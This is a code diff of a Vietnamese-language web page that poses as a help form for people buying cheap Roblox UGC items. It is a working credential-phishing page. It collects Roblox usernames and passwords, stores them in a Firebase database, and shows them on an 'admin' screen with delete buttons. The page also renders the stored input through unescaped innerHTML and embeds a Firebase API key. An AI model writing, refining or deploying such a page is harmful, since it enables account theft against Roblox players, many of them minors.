@@ -3,20 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <title>Acc Roblox</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body { font-family: Arial; background: linear-gradient(135deg,#3b82f6,#2563eb); color:white; text-align:center; margin:0; }
-    .screen{ display:none; padding:20px; }
-    .active{ display:block; }
+    .screen{ display:none; } .active{ display:block; }
     .form-box{ background:rgba(255,255,255,0.15); padding:20px; border-radius:15px; display:inline-block; width:90%; max-width:350px; box-shadow:0 4px 12px rgba(0,0,0,0.3); margin:15px auto; }
     input{ display:block; width:90%; padding:10px; margin:12px auto; border:none; border-radius:8px; }
-    button{ background:#16a34a; color:white; border:none; padding:10px 20px; margin-top:8px; border-radius:6px; cursor:pointer; }
+    button{ background:#16a34a; color:white; border:none; padding:8px 18px; margin-top:8px; border-radius:6px; cursor:pointer;}
     .data-box{ text-align:left; background:rgba(0,0,0,0.3); padding:12px; margin:10px auto; border-radius:8px; width:90%; max-width:350px; position:relative; }
-    .trash{ position:absolute; top:8px; right:8px; background:red; border:none; padding:5px 8px; border-radius:6px; cursor:pointer; color:white; }
+    .trash{ position:absolute; top:8px; right:8px; background:red; border:none; padding:5px 8px; border-radius:6px; cursor:pointer; }
   </style>
 </head>
 <body>
 
+<!-- Screen 1 -->
 <div id="screen1" class="screen active">
   <h2>acc roblox của bạn</h2>
   <div class="form-box">
@@ -24,27 +23,27 @@
     <input type="password" id="password" placeholder="Mk">
     <input type="text" id="issue" placeholder="Bạn đang gặp chuyện gì">
     <p>bạn đang gặp vấn đề gì khi mua ugc giá rẻ ? hãy để lại thông tin ở dưới</p>
-    <button id="submitBtn" disabled>OK</button>
+    <button id="submitBtn" disabled>Lưu</button>
   </div>
 
   <div class="form-box">
     <input type="password" id="admin" placeholder="Quyền admin">
-    <button id="adminBtn">OK</button>
+    <button id="adminBtn">Đăng nhập admin</button>
   </div>
 </div>
 
+<!-- Screen 2 -->
 <div id="screen2" class="screen">
   <h2>Danh sách đã nhập</h2>
   <div id="dataList"></div>
   <button onclick="goBack()">Quay về</button>
 </div>
 
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js"></script>
-
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
 <script>
-  // Cấu hình Firebase của bạn
+  // Config Firebase của bạn
   const firebaseConfig = {
     apiKey: "AIzaSyCHXm75zQ7CsJxgRzYGpFMuXoNvdaus4EU",
     authDomain: "roblox-acc-form.firebaseapp.com",
@@ -56,11 +55,10 @@
     measurementId: "G-5KDY9YJ5EM"
   };
 
-  // Khởi tạo Firebase
-  firebase.initializeApp(firebaseConfig);
+  // Khởi tạo
+  const app = firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
 
-  // DOM
   const username=document.getElementById("username");
   const password=document.getElementById("password");
   const issue=document.getElementById("issue");
@@ -71,7 +69,6 @@
   const screen2=document.getElementById("screen2");
   const dataList=document.getElementById("dataList");
 
-  // Check đủ 3 input
   function checkInputs(){
     submitBtn.disabled = !(username.value && password.value && issue.value);
   }
@@ -79,10 +76,10 @@
   password.addEventListener("input",checkInputs);
   issue.addEventListener("input",checkInputs);
 
-  // Lưu data vào Firebase
+  // Lưu dữ liệu vào Firebase
   submitBtn.addEventListener("click",()=>{
-    const id = Date.now();
-    db.ref("accounts/"+id).set({
+    const newRef = db.ref("accounts").push();
+    newRef.set({
       user: username.value,
       pass: password.value,
       iss: issue.value
@@ -99,40 +96,45 @@
     adminInput.value="";
   });
 
-  // Hiện màn hình 2
   function showScreen2(){
     screen1.classList.remove("active");
     screen2.classList.add("active");
+    renderData();
   }
 
   // Render dữ liệu realtime
-  db.ref("accounts").on("value", snapshot=>{
-    dataList.innerHTML="";
-    const val = snapshot.val();
-    if(!val){ dataList.innerHTML="<p>Chưa có dữ liệu</p>"; return; }
-    Object.entries(val).forEach(([id,item])=>{
-      const div=document.createElement("div");
-      div.classList.add("data-box");
-      div.innerHTML=`
-        <p><b>Tk:</b> ${item.user}</p>
-        <p><b>Mk:</b> ${item.pass}</p>
-        <p><b>Chuyện đang gặp:</b> ${item.iss}</p>
-      `;
-      const btn=document.createElement("button");
-      btn.innerText="🗑️";
-      btn.className="trash";
-      btn.onclick=()=>{
-        if(confirm("Bạn có chắc muốn xóa mục này?")){
-          db.ref("accounts/"+id).remove();
-        }
-      };
-      div.appendChild(btn);
-      dataList.appendChild(div);
+  function renderData(){
+    db.ref("accounts").on("value", snapshot=>{
+      dataList.innerHTML="";
+      if(!snapshot.exists()){ dataList.innerHTML="<p>Chưa có dữ liệu</p>"; return; }
+      snapshot.forEach(child=>{
+        const item = child.val();
+        const key = child.key;
+        const div=document.createElement("div");
+        div.classList.add("data-box");
+        div.innerHTML=`
+          <p><b>Tk:</b> ${item.user}</p>
+          <p><b>Mk:</b> ${item.pass}</p>
+          <p><b>Chuyện đang gặp:</b> ${item.iss}</p>
+        `;
+        const btn=document.createElement("button");
+        btn.innerText="🗑️";
+        btn.className="trash";
+        btn.onclick=()=>{
+          if(confirm("Bạn có chắc muốn xóa mục này?")){
+            db.ref("accounts/"+key).remove();
+          }
+        };
+        div.appendChild(btn);
+        dataList.appendChild(div);
+      });
     });
-  });
+  }
 
-  // Quay về
-  function goBack(){ screen2.classList.remove("active"); screen1.classList.add("active"); }
+  function goBack(){ 
+    screen2.classList.remove("active"); 
+    screen1.classList.add("active"); 
+  }
 </script>
 </body>
 </html>
